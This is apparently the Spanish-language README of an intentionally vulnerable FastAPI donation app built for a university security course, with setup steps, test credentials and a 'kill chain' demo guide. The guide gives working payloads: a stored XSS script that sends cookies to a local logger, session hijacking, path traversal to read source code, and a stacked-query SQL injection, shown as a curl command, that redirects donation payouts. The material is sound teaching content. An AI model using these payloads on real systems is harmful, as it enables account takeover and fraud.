# Demo de Donaciones Vulnerable

Aplicacion FastAPI educativa que renderiza HTML directo, pensada para practicar pruebas de vulnerabilidades web en un entorno local.

## Ejecutar

**Terminal 1 — aplicacion:**

```bash
python3 -m venv .venv
source .venv/bin/activate
pip install -r requirements.txt
python seed.py
uvicorn main:app --reload
```

Abrir: http://127.0.0.1:8000

**Terminal 2 — captura de cookies (Paso 1):**

```bash
python tools/cookie_logger.py
```

## Datos de ejemplo

```bash
python seed.py
```

El seed crea usuarios, peticiones, firmas, donaciones y comentarios. Incluye ejemplos para perros rescatados y limpieza del Riachuelo.
Tambien carga saldos ficticios en la billetera interna de cada usuario.

Usuarios de prueba (ademas del admin):

| Usuario | Password |
| --- | --- |
| martin | martin123 |
| sofia | sofia123 |
| lucia | lucia123 |
| diego | diego123 |
| camila | camila123 |

Usuario administrador:

- Usuario: `admin`
- Password: `admin`

## Billetera interna

La app usa dinero simulado dentro de SQLite. Para cargar saldo, entrar a `Mi perfil` y usar el boton mockeado de Mercado Pago.

Desde el perfil tambien se puede retirar saldo indicando un alias propio. Las donaciones transfieren directamente saldo interno del donante al creador de la publicacion.

Cada peticion muestra el **alias de cobro / CBU destino** (`bank_alias`) para ver el impacto del desvio de fondos.

> No usar en produccion. La app evita protecciones habituales a proposito para que sea facil inspeccionar y probar.

## Inspector de vulnerabilidades con OpenAI

1. Crear `.env.inspector` a partir de `.env.inspector.example` y completar `OPENAI_API_KEY`.
2. Pegar un unico archivo `.txt` dentro de `tools/`.
3. Ejecutar:

```bash
python tools/vulnerability_inspector.py
```

El inspector envia el contenido del `.txt` a OpenAI, imprime el JSON y lo guarda junto
al archivo original. Por ejemplo, `tools/endpoints.txt` genera `tools/endpoints.json`.
Para indicar un archivo concreto:

```bash
python tools/vulnerability_inspector.py --input tools/endpoints.txt
```

Para indicar otro nombre de salida:

```bash
python tools/vulnerability_inspector.py --output tools/reporte.json
```

---

## Guia de demostracion (Kill Chain)

Documento completo del TP: [trabajo-practico-cuatrimestral.md](trabajo-practico-cuatrimestral.md)

### Paso 1 — Stored XSS

1. Entrar como `martin` / `martin123`.
2. Abrir la peticion **Jornada comunitaria para limpiar el Riachuelo**.
3. En comentarios, publicar:

```html
<script>fetch('http://127.0.0.1:9000/log?cookie=' + document.cookie)</script>
```

4. Tener corriendo `python tools/cookie_logger.py` en otra terminal.

### Paso 2 — Secuestro de sesion

1. En otro navegador o perfil, entrar como `admin` / `admin`.
2. Visitar la misma peticion del Riachuelo (se ejecuta el script y el logger muestra la cookie `session=...`).
3. En el navegador del atacante (`martin`): F12 → Almacenamiento → Cookies → reemplazar `session` por el valor robado.
4. Recargar y abrir http://127.0.0.1:8000/admin

### Paso 3 — Path traversal y reconocimiento

1. En `/admin`, seccion **Descarga de Logs de Actividad**.
2. Descargar `var/www/app/logs/errors.log` y buscar la ruta `/var/www/app/main.py` en el traceback.
3. En la barra de direcciones, cambiar el parametro a:

```text
/admin/logs/download?file=main.py
```

4. Buscar en el codigo el endpoint `POST /api/v2/legacy_mark_reviewed_77x9a`.

### Paso 4 — SQLi (stacked queries)

En Postman (o curl), enviar `POST` a:

```text
http://127.0.0.1:8000/api/v2/legacy_mark_reviewed_77x9a
```

Body `x-www-form-urlencoded`:

| Campo | Valor de ejemplo |
| --- | --- |
| petition_id | `1; UPDATE petitions SET bank_alias = 'ATACANTE.DESVIO.MP' WHERE title LIKE '%Riachuelo%'; --` |

Recargar la peticion del Riachuelo: el alias de cobro debe mostrar `ATACANTE.DESVIO.MP`.

Ejemplo con curl:

```bash
curl -X POST http://127.0.0.1:8000/api/v2/legacy_mark_reviewed_77x9a \
  -d "petition_id=1; UPDATE petitions SET bank_alias = 'ATACANTE.DESVIO.MP' WHERE title LIKE '%Riachuelo%'; --"
```
